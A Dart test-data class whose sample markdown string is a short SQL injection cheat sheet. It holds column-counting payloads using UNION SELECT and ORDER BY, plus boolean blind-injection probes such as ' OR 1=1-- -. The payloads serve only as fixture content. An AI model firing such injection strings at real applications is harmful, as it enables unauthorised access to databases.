class TestData {
  static String testMarkdown = '''
# SQL Injection
**In the payloads here, I use "-- -", this is just to show that there's a space after the "--", don't put another "-" after the "-- "**

## Table of Contents
- [SQL Injection](#sql-injection)
  * [Getting The Number of Columns of a Table](#getting-the-number-of-columns-of-a-table)

## Getting The Number of Columns of a Table

### With UNION:

```SQL
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL-- -
```
(Continue until you **don't** get an error which is caused by not having the right amount of columns)

### With ORDER BY:

```SQL
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
(Continue until you **do** get an error which is caused by there not being a column to order by (1st column, 2nd column, etc)

## Testing For Blind SQL Injection
Test if the results of an input (like a search) changes based off of your payload.

```SQL
' OR 1=1-- - (returns true)
' OR 1=2-- - (returns false)

' SELECT 1-- - (returns true)
```
# SQL Injection
**In the payloads here, I use "-- -", this is just to show that there's a space after the "--", don't put another "-" after the "-- "**
''';

  static List<String> filesAndFolders = ["SQL Injection", "SSRF", "Hello/"];
}